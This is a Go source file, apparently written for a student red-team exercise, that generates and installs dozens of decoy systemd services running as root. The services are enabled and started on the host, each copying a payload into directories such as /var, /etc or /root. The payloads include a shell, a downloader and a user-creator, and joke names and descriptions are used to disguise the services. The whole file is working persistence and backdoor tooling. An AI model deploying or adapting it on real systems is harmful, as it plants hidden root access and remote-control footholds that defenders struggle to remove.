//Michael Burke, mdb5315@rit.edu
package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

type service struct {
	name        string
	description string
	path        string
	filename    string
	payload     string
	user        string
}

type servicefile struct {
	contents string
	details  service
}

func (this service) String() string {
	//Tostring function for service
	str := "Name: " + this.name +
		"\nDescription: " + this.description +
		"\nPath: " + this.path +
		"\nFile name: " + this.filename +
		"\nPayload: " + this.payload +
		"\nUser: " + this.user
	return str
}

var isDemo bool
var isQuiet bool = false
var user string
var names, descriptions, paths, filenames, payloads []string
var verbose bool = false

func main() {
	args := os.Args
	isDemo = false
	//Build global variables
	buildDB()
	//Set numServices default value
	numServices := len(names)
	//Check args
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			if args[i] == "--demo" {
				isDemo = true
			} else if args[i] == "-n" {
				numServices, _ = strconv.Atoi(args[i+1])
			} else if args[i] == "-v" {
				verbose = true
			} else if args[i] == "-q" || args[i] == "--quiet" {
				isQuiet = true
			} else if args[i] == "--help" || args[i] == "-h" {
				fmt.Println("Service Creator\n\n" +
					"--demo		|	Lists generated services, but does not install them\n" +
					"-n [num]	|	Generate n services (default: 32)\n" +
					"--help or -h	|	Display this help menu",
				)
				return
			}
		}
	}
	if isQuiet {
		fmt.Println("Please wait...")
	}
	//Generate services
	services := buildServices(numServices)
	//Check to make sure there's at least one of each service
	services = checkServices(services)
	for i := 0; i < len(services); i++ {
		if !isQuiet {
			fmt.Println(services[i].String())
			fmt.Println()
		}

	}
	if !isDemo {
		//Build service files & install them
		servicefiles := buildFiles(services)
		createServices(servicefiles)
		if !isQuiet {
			fmt.Println("Services installed!")
		} else {
			fmt.Println("Done")
		}

	}
}

func checkServices(services []service) []service {
	if len(services) != len(names) {
		return services
	}
	types := []string{
		"downloader",
		"random-messenger",
		"file-creator",
		"user-creator",
		"shell",
	}
	//Iterate through all the services and note which payloads exist
	for i := 0; i < len(services); i++ {
		curService := services[i]
		index := findIndex(types, curService.payload)
		if index != -1 {
			if !isQuiet {
				fmt.Println(curService.payload + " is fine")
			}
			types, _ = remove(types, index)
		}
	}
	//See if any payloads are missing
	if len(types) != 0 {
		for i := 0; i < len(types); i++ {
			if !isQuiet {
				fmt.Println("Caught " + types[i])
			}
			serviceIndex := -1
			//If there are payloads missing, replace one of the
			//sleep payloads with the missing payload
			for e := 0; e < len(services); e++ {
				if services[e].payload == "sleep" {
					serviceIndex = e
				}
			}
			if serviceIndex == -1 {
				return services
			}
			services[serviceIndex].payload = types[i]
		}
	}
	return services

}

func createServices(files []servicefile) {
	if !isQuiet {
		fmt.Println("Installing services...")
	}
	for i := 0; i < len(files); i++ {
		time.Sleep(100 * time.Millisecond)
		curService := files[i]
		//Create the .service file
		createFile("/etc/systemd/system/"+curService.details.name+".service", curService.contents)
		//Place the playload in the correct location
		err1 := copyFile(curService.details.payload+"/"+curService.details.payload, curService.details.path+curService.details.filename)
		if err1 != nil && !isQuiet {
			fmt.Println("Error copying file: ")
			fmt.Println(err1.Error())
		}
		os.Chmod(curService.details.path+curService.details.filename, 0755)
		enableService := exec.Command("systemctl", "enable", curService.details.name+".service")
		err := enableService.Run()
		if err != nil && !isQuiet {
			fmt.Println(err.Error())
		}
		//fmt.Println(out.String())
		runService := exec.Command("systemctl", "start", curService.details.name+".service")
		runService.Run()

	}
}

func copyFile(src, dst string) error {
	//Open the file
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	//Create the new file
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	//Close both files
	defer in.Close()
	defer out.Close()
	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func createFile(path, contents string) {
	ioutil.WriteFile(path, []byte(contents), 0644)
}

func buildFiles(services []service) []servicefile {
	//Create service files based the template
	var servicefiles []servicefile
	dat, _ := ioutil.ReadFile("template.service")
	template := string(dat)
	for i := 0; i < len(services); i++ {
		service := services[i]
		contents := template
		//Replace tags with the service parameters
		contents = strings.Replace(contents, "{description}", service.description, 1)
		contents = strings.Replace(contents, "{user}", service.user, 1)
		if verbose {
			contents = strings.Replace(contents, "{exec}", service.path+service.filename+" -v", 1)
		} else {
			contents = strings.Replace(contents, "{exec}", service.path+service.filename, 1)
		}
		//Create a servicefile object and append it to the list of servicefiles
		newServiceFile := servicefile{contents, service}
		servicefiles = append(servicefiles, newServiceFile)
	}
	return servicefiles
}

func buildDB() {
	//Build global variables
	user = "root"
	names = []string{"yourmom", "freddy-fazbear", "grap", "amogus", "sus", "virus", "redteam", "the-matrix", "uno-reverse-card", "yellowteam", "bingus", "dokidoki", "based", "not-ransomware", "bepis", "roblox", "freevbucks", "notavirus", "heckerman", "benignfile", "yolo", "pickle", "grubhub", "hehe", "amogOS", "society", "yeet", "doge", "mac", "hungy", "youllneverfindme", "red-herring"}
	descriptions = []string{
		"An absolutely vital service for Linux. Do not delete under any circumstances. -redteam",
		"kinda sus bro",
		"Very benign. Much trust.",
		"uhhhhhhh",
		"malware go brrrr",
		"Smudge the crunchy cat",
		"Do me a favor and keep this service running, I have a wife and 4 kids to feed",
		"We've been trying to reach you about your car's extended warranty",
		"hehehehehehehehehehehe",
		"UwU what's this?",
		"Vanessa, I'm a material gorl!",
		"I turned myself into a service Morty! I'm service Rick!",
		"If you or a loved one has been diagnosed with mesothelioma, you may be entitled to a cash reward",
		"It's free real estate",
		"Hot singles in your area",
		"Meesa jar jar binks",
	}
	paths = []string{
		"/var/",
		"/etc/",
		"/home/",
		"/usr/lib/",
		"/root/",
	}
	filenames = []string{
		"randomservice",
		"inconspicuous_file",
		"deleteme",
		"dontdeleteme",
		"heh",
		"b1ngus",
		"file12345",
		"homework",
		"top-secret",
		"temporary-file",
		"lilboi",
		"geck",
		"flappy-bird-game",
		"borger",
		"issaservice",
		"himom",
		"jeffUwU",
		"youfoundme",
	}
	payloads = []string{
		"downloader",
		"file-creator",
		"file-creator",
		"user-creator",
		"user-creator",
		"random-messenger",
		"random-messenger",
		"random-messenger",
		"shell",
		"shell",
		"shell",
		"sleep",
		"sleep",
		"sleep",
		"sleep",
	}
}

func buildServices(num int) []service {
	validNames := names
	var services []service
	for i := 0; i < num; i++ {
		var serviceName, serviceDesc, servicePath, serviceFilename, servicePayload string
		//Make sure that each service has a unique name
		validNames, serviceName = pickFrom(validNames)
		//Pick random service parameters
		serviceDesc = getRandom(descriptions)
		servicePath = getRandom(paths)
		serviceFilename = getRandom(filenames)
		servicePayload = getRandom(payloads)
		for {
			//Make sure that each service has a unique path+filename
			if hasCollision(services, servicePath, serviceFilename) {
				servicePath = getRandom(paths)
				serviceFilename = getRandom(filenames)
			} else {
				break
			}
		}
		//Create a new service object and append it to the list of services
		newService := service{serviceName, serviceDesc, servicePath, serviceFilename, servicePayload, user}
		services = append(services, newService)
	}
	return services
}

func hasCollision(services []service, servicePath string, serviceFilename string) bool {
	//Iterate through created service objects and check to see
	//if any of them match the path+filename of the newly generated service
	for i := 0; i < len(services); i++ {
		curService := services[i]
		if curService.path == servicePath && curService.filename == serviceFilename {
			return true
		}
	}
	return false
}

func pickFrom(slice []string) ([]string, string) {
	//Pick random element from a slice and remove it from the slice
	var val string
	slice, val = remove(slice, getRandomIndex(slice))
	return slice, val
}

func getRandomIndex(slice []string) int {
	//Pick a random index based on a slice's length
	if len(slice) == 1 {
		return 0
	}
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(len(slice) - 1)
}

func getRandom(slice []string) string {
	//Get a random string from a slice
	if len(slice) == 1 {
		return slice[0]
	}
	rand.Seed(time.Now().UnixNano())
	randNum := rand.Intn(len(slice) - 1)
	return slice[randNum]
}

func remove(slice []string, i int) ([]string, string) {
	//Remove an item from a slice
	name := slice[i]
	slice[i] = slice[len(slice)-1]
	slice = slice[:len(slice)-1]
	return slice, name

}

func findIndex(slice []string, value string) int {
	//Find the index of a string in a slice
	for i := range slice {
		if slice[i] == value {
			return i
		}
	}
	return -1
}
